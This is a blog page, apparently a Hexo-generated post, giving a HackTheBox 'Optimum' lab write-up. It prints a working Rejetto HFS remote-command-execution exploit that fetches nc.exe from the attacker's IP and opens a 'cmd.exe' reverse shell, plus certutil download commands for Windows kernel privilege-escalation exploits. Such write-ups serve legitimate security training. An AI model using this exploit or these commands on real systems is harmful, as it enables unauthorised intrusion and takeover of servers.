@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="M1nzhi" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      hackthebox optimum 
+      
+      
+      |
+    
+     Hexo
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Oranges</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">hackthebox optimum</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2021-03-14 19:42:20
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/hackthebox/" title="hackthebox">
+                    <b>#</b> hackthebox
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h3 id="nmap-sS-sC-T4-10-10-10-8"><a href="#nmap-sS-sC-T4-10-10-10-8" class="headerlink" title="nmap -sS -sC -T4 10.10.10.8"></a>nmap -sS -sC -T4 10.10.10.8</h3><p>80/tcp open  http</p>
+<p>反向代理到本地</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  47.91.10.134;</span><br><span class="line"></span><br><span class="line">        location &#x2F; &#123;</span><br><span class="line">                root   html;</span><br><span class="line">                index  index.html index.htm;</span><br><span class="line">                proxy_pass  http:&#x2F;&#x2F;10.10.10.8;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>rejetto exploit</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Rejetto HTTP File Server (HFS) 1.5&#x2F;2.x - Multiple Vulnerabilities                                                                                                                                                                                                                                                | windows&#x2F;remote&#x2F;31056.py</span><br><span class="line">Rejetto HTTP File Server (HFS) 2.2&#x2F;2.3 - Arbitrary File Upload                                                                                                                                                                                                                                                   | multiple&#x2F;remote&#x2F;30850.txt</span><br><span class="line">Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                                                                                                                                                                                              | windows&#x2F;remote&#x2F;34668.txt</span><br><span class="line">Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                                                                                                                                                                              | windows&#x2F;remote&#x2F;39161.py</span><br><span class="line">Rejetto HTTP File Server (HFS) 2.3a&#x2F;2.3b&#x2F;2.3c - Remote Command Execution                                                                                                                                                                                                                                         | windows&#x2F;webapps&#x2F;34852.txt</span><br><span class="line">Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                                                                                                                                                                                                                      | windows&#x2F;webapps&#x2F;49125.py</span><br></pre></td></tr></table></figure>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>exploit</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import urllib2</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">        def script_create():</span><br><span class="line">                urllib2.urlopen(&quot;http:&#x2F;&#x2F;&quot;+sys.argv[1]+&quot;:&quot;+sys.argv[2]+&quot;&#x2F;?search&#x3D;%00&#123;.+&quot;+save+&quot;.&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        def execute_script():</span><br><span class="line">                urllib2.urlopen(&quot;http:&#x2F;&#x2F;&quot;+sys.argv[1]+&quot;:&quot;+sys.argv[2]+&quot;&#x2F;?search&#x3D;%00&#123;.+&quot;+exe+&quot;.&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        def nc_run():</span><br><span class="line">                urllib2.urlopen(&quot;http:&#x2F;&#x2F;&quot;+sys.argv[1]+&quot;:&quot;+sys.argv[2]+&quot;&#x2F;?search&#x3D;%00&#123;.+&quot;+exe1+&quot;.&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        ip_addr &#x3D; &quot;10.10.14.21&quot; #local IP address</span><br><span class="line">        local_port &#x3D; &quot;443&quot; # Local Port number</span><br><span class="line">        vbs &#x3D; &quot;C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F&quot;+ip_addr+&quot;%2F%3a8000nc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with&quot;</span><br><span class="line">        save&#x3D; &quot;save|&quot; + vbs</span><br><span class="line">        vbs2 &#x3D; &quot;cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs&quot;</span><br><span class="line">        exe&#x3D; &quot;exec|&quot;+vbs2</span><br><span class="line">        vbs3 &#x3D; &quot;C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20&quot;+ip_addr+&quot;%20&quot;+local_port</span><br><span class="line">        exe1&#x3D; &quot;exec|&quot;+vbs3</span><br><span class="line">        script_create()</span><br><span class="line">        execute_script()</span><br><span class="line">        nc_run()</span><br><span class="line">except:</span><br><span class="line">        print &quot;&quot;&quot;[.]Something went wrong..!</span><br><span class="line">        Usage is :[.] python exploit.py &lt;Target IP address&gt;  &lt;Target Port Number&gt;</span><br><span class="line">        Don&#39;t forgot to change the Local IP address and Port number on the script&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>SYSTEMINFO</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">Host Name:                 OPTIMUM                                                       </span><br><span class="line">OS Name:                   Microsoft Windows Server 2012 R2 Standard                     </span><br><span class="line">OS Version:                6.3.9600 N&#x2F;A Build 9600</span><br><span class="line">OS Manufacturer:           Microsoft Corporation                          </span><br><span class="line">OS Configuration:          Standalone Server                        </span><br><span class="line">OS Build Type:             Multiprocessor Free                             </span><br><span class="line">Registered Owner:          Windows User                                 </span><br><span class="line">Registered Organization:                                        </span><br><span class="line">Product ID:                00252-70000-00000-AA535       </span><br><span class="line">Original Install Date:     18&#x2F;3&#x2F;2017, 1:51:36                                </span><br><span class="line">System Boot Time:          20&#x2F;3&#x2F;2021, 9:17:22                                         </span><br><span class="line">System Manufacturer:       VMware, Inc. </span><br><span class="line">System Model:              VMware Virtual Platform                </span><br><span class="line">System Type:               x64-based PC        </span><br><span class="line">Processor(s):              1 Processor(s) Installed.</span><br><span class="line">                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz                          </span><br><span class="line">BIOS Version:              Phoenix Technologies LTD 6.00, 12&#x2F;12&#x2F;2018                    </span><br><span class="line">Windows Directory:         C:\Windows                     </span><br><span class="line">System Directory:          C:\Windows\system32                </span><br><span class="line">Boot Device:               \Device\HarddiskVolume1     </span><br><span class="line">System Locale:             el;Greek</span><br><span class="line">Input Locale:              en-us;English (United States)</span><br><span class="line">Time Zone:                 (UTC+02:00) Athens, Bucharest</span><br><span class="line">Total Physical Memory:     4.095 MB         </span><br><span class="line">Available Physical Memory: 2.980 MB                      </span><br><span class="line">Virtual Memory: Max Size:  8.191 MB                           </span><br><span class="line">Virtual Memory: Available: 7.056 MB                              </span><br><span class="line">Virtual Memory: In Use:    1.135 MB</span><br><span class="line">Page File Location(s):     C:\pagefile.sys            </span><br><span class="line">Domain:                    HTB         </span><br><span class="line">Logon Server:              \\OPTIMUM  </span><br><span class="line">Hotfix(s):                 31 Hotfix(s) Installed.                     </span><br><span class="line">                           [01]: KB2959936                           </span><br><span class="line">                           [02]: KB2896496                       </span><br><span class="line">                           [03]: KB2919355</span><br><span class="line">                           [04]: KB2920189</span><br><span class="line">                           [05]: KB2928120</span><br><span class="line">                           [06]: KB2931358</span><br><span class="line">							[07]: KB2931366</span><br><span class="line">                           [08]: KB2933826</span><br><span class="line">                           [09]: KB2938772</span><br><span class="line">                           [10]: KB2949621</span><br><span class="line">                           [11]: KB2954879</span><br><span class="line">                           [12]: KB2958262</span><br><span class="line">                           [13]: KB2958263</span><br><span class="line">                           [14]: KB2961072</span><br><span class="line">                           [15]: KB2965500</span><br><span class="line">                           [16]: KB2966407</span><br><span class="line">                           [17]: KB2967917</span><br><span class="line">                           [18]: KB2971203</span><br><span class="line">                           [19]: KB2971850</span><br><span class="line">                           [20]: KB2973351</span><br><span class="line">                           [21]: KB2973448</span><br><span class="line">                           [22]: KB2975061</span><br><span class="line">                           [23]: KB2976627</span><br><span class="line">                           [24]: KB2977629</span><br><span class="line">                           [25]: KB2981580</span><br><span class="line">                           [26]: KB2987107</span><br><span class="line">                           [27]: KB2989647</span><br><span class="line">                           [28]: KB2998527</span><br><span class="line">                           [29]: KB3000850</span><br><span class="line">                           [30]: KB3003057</span><br><span class="line">                           [31]: KB3014442</span><br><span class="line">Network Card(s):           1 NIC(s) Installed.</span><br><span class="line">                           [01]: Intel(R) 82574L Gigabit Network Connection</span><br><span class="line">                                 Connection Name: Ethernet0</span><br><span class="line">                                 DHCP Enabled:    No</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 10.10.10.8</span><br><span class="line">Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.</span><br></pre></td></tr></table></figure>
+
+<p>windows-exploit-suggester.py –database xls –systeminfo systeminfo.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important                                                                  </span><br><span class="line">[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;40745&#x2F; -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)</span><br><span class="line">[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;41015&#x2F; -- Microsoft Windows Kernel - &#39;win32k.sys&#39; &#39;NtSetWindowLongPtr&#39; Privilege Escalation (MS16-135) (2)</span><br><span class="line">[*]   https:&#x2F;&#x2F;github.com&#x2F;tinysec&#x2F;public&#x2F;tree&#x2F;master&#x2F;CVE-2016-7255</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important</span><br><span class="line">[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;41020&#x2F; -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)</span><br></pre></td></tr></table></figure>
+<p>下载提权工具<br><a href="https://www.exploit-db.com/exploits/41015/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/41015/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;10.10.14.21:8000&#x2F;41015.exe c:\users\public\41015.exe</span><br></pre></td></tr></table></figure>
+<p>失败</p>
+<p><a href="https://www.exploit-db.com/exploits/41020/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/41020/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;10.10.14.21:8000&#x2F;41020.exe c:\users\public\41020.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.ax1x.com/2021/03/14/60LzDS.png" alt="image"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/03/10/hackthebox-devel/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2021-03-14 19:42:20
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/hackthebox/" title="hackthebox">
+                        <b>#</b> hackthebox
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2021/04/18/smsdefense/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div class="post-catalog" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap-sS-sC-T4-10-10-10-8"><span class="toc-text">nmap -sS -sC -T4 10.10.10.8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getshell"><span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#提权"><span class="toc-text">提权</span></a></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" href="https://github.com/zchengsite/hexo-theme-oranges" target="_blank" rel="noopener">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" href="">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" href="">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" href="">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="weibo" href="">
+            <i class="iconfont icon-weibo"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="rss" href="/atom.xml">
+            <i class="iconfont icon-rss"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a href="https://github.com/zchengsite/hexo-theme-oranges" target="_blank" rel="noopener">Copyright © Oranges 2020</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a href="https://github.com/zchengsite/hexo-theme-oranges" target="_blank" rel="noopener">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+      
+  <div class="search-icon" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+    </div>
+  </body>
+</html>
